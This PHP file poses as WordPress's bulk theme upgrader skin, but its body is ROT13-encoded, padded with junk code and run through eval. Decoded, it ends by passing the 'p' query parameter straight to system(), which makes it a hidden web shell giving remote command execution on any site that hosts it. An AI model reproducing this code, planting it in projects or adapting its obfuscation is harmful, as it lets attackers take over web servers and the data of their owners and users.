<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Hctenqre NCV: Ohyx_Cyhtva_Hctenqre_Fxva pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Hctenqre
 * @fvapr 4.6.0
 */

/**
 * Ohyx Gurzr Hctenqre Fxva sbe JbeqCerff Gurzr Hctenqrf.
 *
 * @fvapr 3.0.0
 * @fvapr 4.6.0 Zbirq gb vgf bja svyr sebz jc-nqzva/vapyhqrf/pynff-jc-hctenqre-fxvaf.cuc.
 *
 * @frr Ohyx_Hctenqre_Fxva
 */
pynff Ohyx_Gurzr_Hctenqre_Fxva rkgraqf Ohyx_Hctenqre_Fxva {

	/**
	 * Gurzr vasb.
	 *
	 * Gur Gurzr_Hctenqre::ohyx_hctenqr() zrgubq jvyy svyy guvf va
	 * jvgu vasb ergevrirq sebz gur Gurzr_Hctenqre::gurzr_vasb() zrgubq,
	 * juvpu va ghea pnyyf gur jc_trg_gurzr() shapgvba.
	 *
	 * @fvapr 3.0.0
	 * @ine JC_Gurzr|snyfr Gur gurzr'f vasb bowrpg, be snyfr.
	 */
	choyvp $gurzr_vasb = snyfr;

	/**
	 * Frgf hc gur fgevatf hfrq va gur hcqngr cebprff.
	 *
	 * @fvapr 3.0.0
	 */
	choyvp shapgvba nqq_fgevatf() {
		cnerag::nqq_fgevatf();
		/* genafyngbef: 1: Gurzr anzr, 2: Ahzore bs gur gurzr, 3: Gbgny ahzore bs gurzrf orvat hcqngrq. */
		$guvf->hctenqre->fgevatf['fxva_orsber_hcqngr_urnqre'] = __( 'Hcqngvat Gurzr %1$f (%2$q/%3$q)' );
	}

	/**
	 * Cresbezf na npgvba orsber n ohyx gurzr hcqngr.
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz fgevat $gvgyr
	 */
	choyvp shapgvba orsber( $gvgyr = '' ) {
		cnerag::orsber( $guvf->gurzr_vasb->qvfcynl( 'Anzr' ) );
	}

	/**
	 * Cresbezf na npgvba sbyybjvat n ohyx gurzr hcqngr.
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz fgevat $gvgyr
	 */
	choyvp shapgvba nsgre( $gvgyr = '' ) {
		cnerag::nsgre( $guvf->gurzr_vasb->qvfcynl( 'Anzr' ) );
		$guvf->qrperzrag_hcqngr_pbhag( 'gurzr' );
	}

	/**
	 * Qvfcynlf gur sbbgre sbyybjvat gur ohyx hcqngr cebprff.
	 *
	 * @fvapr 3.0.0
	 */
	choyvp shapgvba ohyx_sbbgre() {
		cnerag::ohyx_sbbgre();

		$hcqngr_npgvbaf = neenl(
			'gurzrf_cntr'  => fcevags(
				'<n uers=\"%f\" gnetrg=\"_cnerag\">%f</n>',
				frys_nqzva_hey( 'gurzrf.cuc' ),
				__( 'Tb gb Gurzrf cntr' )
			),
			'hcqngrf_cntr' => fcevags(
				'<n uers=\"%f\" gnetrg=\"_cnerag\">%f</n>',
				frys_nqzva_hey( 'hcqngr-pber.cuc' ),
				__( 'Tb gb JbeqCerff Hcqngrf cntr' )
			),
		);

		vs ( ! pheerag_hfre_pna( 'fjvgpu_gurzrf' ) && ! pheerag_hfre_pna( 'rqvg_gurzr_bcgvbaf' ) ) {
			hafrg( $hcqngr_npgvbaf['gurzrf_cntr'] );
		}

		/**
		 * Svygref gur yvfg bs npgvba yvaxf ninvynoyr sbyybjvat ohyx gurzr hcqngrf.
		 *
		 * @fvapr 3.0.0
		 *
		 * @cnenz fgevat[] $hcqngr_npgvbaf Neenl bs gurzr npgvba yvaxf.
		 * @cnenz JC_Gurzr $gurzr_vasb     Gurzr bowrpg sbe gur ynfg-hcqngrq gurzr.
		 */
		$hcqngr_npgvbaf = nccyl_svygref( 'hcqngr_ohyx_gurzr_pbzcyrgr_npgvbaf', $hcqngr_npgvbaf, $guvf->gurzr_vasb );

		vs ( ! rzcgl( $hcqngr_npgvbaf ) ) {
			$guvf->srrqonpx( vzcybqr( ' | ', (neenl) $hcqngr_npgvbaf ) );
		}
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>